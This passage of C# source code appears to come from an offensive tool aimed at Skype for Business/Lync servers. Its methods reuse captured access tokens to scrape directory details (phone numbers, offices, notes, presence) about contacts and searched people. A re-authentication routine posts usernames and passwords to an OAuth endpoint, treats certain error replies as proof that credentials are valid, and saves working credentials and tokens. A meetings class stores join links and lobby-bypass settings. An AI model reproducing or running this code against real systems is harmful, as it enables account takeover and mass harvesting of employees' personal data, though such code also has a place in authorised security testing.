                        break;
                }

            }

            if (choosePhoneNumber)
            {
                //PROBABLY NEEDS TO BE MULTIPLE AS WELL
                string tempPhoneNumber = (string)rootToken.SelectToken("workPhoneNumber");
                if (tempPhoneNumber != null)
                {
                    phoneNumber = tempPhoneNumber.Replace("tel:", "");
                }

            }
            else
            {
                phoneNumber = "";
            }

            //These 3 require extra threads
            //CANT PULL ANY OF THESE FOR SELF - maybe other useful stuff though like meeting notes and history
            if (chooseNote)
            {
                switch (requestType)
                {
                    //Self - handled elsewhere
                    case GALRequest.PersonalContacts:
                        string contactNote = (string)rootToken.SelectToken("_links.contactNote.href");
                        string contactNoteLink = "https://" + RealAddress + contactNote;
                        additionalLinks = AddLink(name, contactNoteLink, additionalLinks);
                        break;
                    case GALRequest.PeopleSearch:
                        if (personalContacts.Contains(name))
                        {

                        }
                        else
                        {
                            string searchNote = (string)rootToken.SelectToken("_links.contactNote.href");
                            string searchNoteLink = "https://" + RealAddress + searchNote;
                            additionalLinks = AddLink(name, searchNoteLink, additionalLinks);
                        }
                        break;
                }
            }

            if (chooseOffice)
            {
                switch (requestType)
                {
                    case GALRequest.Self:
                        office = (string)rootToken.SelectToken("officeLocation");
                        break;
                    case GALRequest.PersonalContacts:
                        office = (string)rootToken.SelectToken("office");
                        break;
                    case GALRequest.PeopleSearch:
                        if (personalContacts.Contains(name))
                        {

                        }
                        else
                        {
                            string contactOfficeFull = (string)rootToken.SelectToken("_links.self.href");
                            string contactOfficeLinkFull = "https://" + RealAddress + contactOfficeFull;
                            additionalLinks = AddLink(name, contactOfficeLinkFull, additionalLinks);
                        }
                        break;
                }

            }
            if (choosePresence)
            {
                switch (requestType)
                {
                    //Self - handled elsewhere
                    case GALRequest.PersonalContacts:
                        string contactPresence = (string)rootToken.SelectToken("_links.contactPresence.href");
                        string contactPresenceLink = "https://" + RealAddress + contactPresence;
                        additionalLinks = AddLink(name, contactPresenceLink, additionalLinks);
                        break;
                    case GALRequest.PeopleSearch:
                        if (personalContacts.Contains(name))
                        {

                        }
                        else
                        {
                            string searchPresence = (string)rootToken.SelectToken("_links.contactPresence.href");
                            string searchPresenceLink = "https://" + RealAddress + searchPresence;
                            additionalLinks = AddLink(name, searchPresenceLink, additionalLinks);
                        }
                        break;
                }
            }

            DataRecord tempRecord = new DataRecord() { Department = department, EmailAddress = emailAddress, Name = name, Note = note, PhoneNumber = phoneNumber, SIPUsername = SipUsername, Title = title, Office = office, Presence = presence };
            AddDataRecord.AddOrUpdateDataRecords(tempRecord, dataList, UI);
            return additionalLinks;
        }

        public async void MakeAdditionalRequests(Dictionary<string, List<string>> additionalLinks, string accessToken, bool chooseNote, bool choosePresence, bool choosePhoneNumber, bool chooseOffice, ObservableCollection<DataRecord> dataList)
        {

            List<Task> additionalLinksTasks = new List<Task>();

            foreach (KeyValuePair<string, List<string>> dic in additionalLinks)
            {
                foreach (string link in dic.Value)
                {
                    if (killSwitch == 1)
                    {
                        break;
                    }
                    additionalLinksTasks.Add(MakeAdditionalLinksRequestAsync(link, accessToken, chooseNote, choosePresence, choosePhoneNumber, chooseOffice, dataList, dic.Key));
                }

            }
            await Task.WhenAll(additionalLinksTasks);
            //Finally say done!
            UI.ThreadSafeAppendLog("[1][*] Finished Address Book task...");
            UI.saveAddressBook(null, Enums.SaveType.autoLog);
            UI.unlockUI();
        }

        public Task MakeAdditionalLinksRequestAsync(string url, string accessToken, bool chooseNote, bool choosePresence, bool choosePhoneNumber, bool chooseOffice, ObservableCollection<DataRecord> dataList, string name)
        {
            WebRequests additionalLinksRequest = PostCredsHelper.CreateWebRequest(url, UI, Enums.HttpMethodChoice.GET, accessToken);

            UI.ThreadSafeAppendLog("[3]Making GET request to: " + url);
            if (killSwitch == 1)
            {
                return Task.CompletedTask;
            }
            HttpWebResponse additionalLinksResponse = additionalLinksRequest.MakeGETRequest();
            string responseStringGAL = WebRequests.GetResponseString(additionalLinksResponse);
            UI.ThreadSafeAppendLog("[3]Response: " + responseStringGAL);
            JObject rootObject = JObject.Parse(responseStringGAL);
            ParseJSONAdditionalLinks(rootObject, UI, name, dataList, chooseNote, chooseOffice, choosePhoneNumber, choosePresence);

            return Task.CompletedTask;
        }

        public void ParseJSONAdditionalLinks(JToken rootToken, MainWindow UI, string name, ObservableCollection<DataRecord> dataList, bool chooseNote, bool chooseOffice, bool choosePhoneNumber, bool choosePresence)
        {
            string SipUsername = "";
            string emailAddress = "";
            string title = "";
            string department = "";
            string phoneNumber = "";
            string note = "";
            string presence = "";
            string office = "";

            //Do both and one will just be null
            if (chooseNote)
                note = (string)rootToken.SelectToken("message");
            if (chooseOffice)
                office = (string)rootToken.SelectToken("office");
            if (choosePhoneNumber)
                phoneNumber = (string)rootToken.SelectToken("workPhoneNumber");
            if (choosePresence)
            {
                if ((string)rootToken.SelectToken("availability") == "" || (string)rootToken.SelectToken("availability") == null)
                {

                }
                else
                {
                    presence = (string)rootToken.SelectToken("availability") + ", " + (string)rootToken.SelectToken("deviceType");
                }
            }
            DataRecord tempRecord = new DataRecord() { Department = department, EmailAddress = emailAddress, Name = name, Note = note, PhoneNumber = phoneNumber, SIPUsername = SipUsername, Title = title, Office = office, Presence = presence };
            AddDataRecord.AddOrUpdateDataRecords(tempRecord, dataList, UI);
        }



        public List<string> LoadList(string path)
        {
            List<string> listToReturn = new List<string>();
            try
            {
                var assembly = Assembly.GetExecutingAssembly();
                using (Stream resourceStream = assembly.GetManifestResourceStream(path))
                {
                    if (resourceStream == null)
                        return null;
                    else
                    {
                        using (StreamReader reader = new StreamReader(resourceStream))
                        {
                            string line;
                            while ((line = reader.ReadLine()) != null)
                            {
                                listToReturn.Add(line);
                            }

                        }
                        return listToReturn;
                    }
                }
            }
            catch (Exception e)
            {
                UI.ThreadSafeAppendLog("[1]File exception: " + e.ToString());
                return null;
            }

        }


        public Boolean AuthenticateDifferentApplicationsHost(CredentialsRecord record, string host)
        {
            string targetOauthURL = "https://" + host + "/WebTicket/oauthtoken";
            //This CAN BE either legacy or modern format - so just go with what we have as known valid
            //Only causes issue with legacy here if user is invalid = v slow
            string domainUser = record.Username;
            UI.ThreadSafeAppendLog("[4]Record username in required format: " + domainUser);

            string postData = "grant_type=password&username=" + domainUser + "&password=" + Uri.EscapeDataString(record.Password);

            //Add headers and timout to web request
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(targetOauthURL);
            request.ContentType = "application/x-www-form-urlencoded";
            request.UserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:55.0) Gecko/20100101 Firefox/55.0";
            request.Method = "POST";
            var data = Encoding.ASCII.GetBytes(postData);
            request.ContentLength = data.Length;

            try
            {

                using (var stream = request.GetRequestStream())
                {
                    stream.Write(data, 0, data.Length);
                }
                var response = (HttpWebResponse)request.GetResponse();
                var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
                response.Close();
                UI.ThreadSafeAppendLog("[3]Response to Re-authentication to real host: " + responseString);

                if (responseString.Contains("access_token"))
                {
                    //Add access token to existing record
                    Match accessTokenMatch = RegexClass.ReturnMatch(Regexs.cwtToken, responseString);
                    if (accessTokenMatch.Success)
                    {
                        string accessToken = accessTokenMatch.Value;
                        record.Token = accessToken;
                        record.Service = MicrosoftService.Skype;
                        UI.ThreadSafeAppendLog("[3]Valid access token added for user: " + record.Username);
                        UI.saveValidUsersAndCreds(null, SaveType.autoLog);
                        return true;
                    }
                    else
                    {
                        UI.ThreadSafeAppendLog("[1]Valid Credentials found for user: " + record.Username + ", but unable to match access token.");
                        return false;
                    }
                }
            }
            catch (WebException webException3)
            {
                HttpWebResponse response = webException3.Response as HttpWebResponse;
                try
                {

                    var responseString = new StreamReader(response.GetResponseStream()).ReadToEnd();
                    UI.ThreadSafeAppendLog("[3]Response to Re-authentication to real server: " + responseString);
                    if (responseString.Contains("access_token"))
                    {
                        Match accessTokenMatch = RegexClass.ReturnMatch(Regexs.cwtToken, responseString);
                        if (accessTokenMatch.Success)
                        {
                            string accessToken = accessTokenMatch.Value;
                            record.Token = accessToken;
                            record.Service = MicrosoftService.Skype;
                            UI.ThreadSafeAppendLog("[3]Valid access token added for user: " + record.Username);
                            UI.saveValidUsersAndCreds(null, SaveType.autoLog);
                            return true;
                        }
                        else
                        {
                            UI.ThreadSafeAppendLog("[1]Valid Credentials found for user: " + record.Username + ", but unable to match access token.");
                            return false;
                        }
                    }
                    else if (responseString.Contains("Bad Request"))
                    {
                        UI.ThreadSafeAppendLog("[1]Valid credentials found - User not SIP enabled or similar: " + record.Username);
                        return false;

                    }
                }
                catch (Exception esdf)
                {
                    UI.ThreadSafeAppendLog("[1]Exception: " + esdf.ToString());
                    return false;
                }

            }
            catch (Exception ex)
            {
                UI.ThreadSafeAppendLog("[1]Exception: " + ex.ToString());
                return false;
            }
            return false;

        }




    }

    public class MeetingsObject
    {
        private CredentialsRecord userRecord;
        private string confID;
        private string subject;
        private string attendees;
        private string link;
        private string expirationTime;
        private string joinURL;
        private string lobbyBypass;

        public string ConfID { get => confID; set => confID = value; }
        public string Subject { get => subject; set => subject = value; }
        public string Attendees { get => attendees; set => attendees = value; }
        public string Link { get => link; set => link = value; }
        public string ExpirationTime { get => expirationTime; set => expirationTime = value; }
        public string JoinURL { get => joinURL; set => joinURL = value; }
        public string LobbyBypass { get => lobbyBypass; set => lobbyBypass = value; }
        public CredentialsRecord UserRecord { get => userRecord; set => userRecord = value; }
    }
}
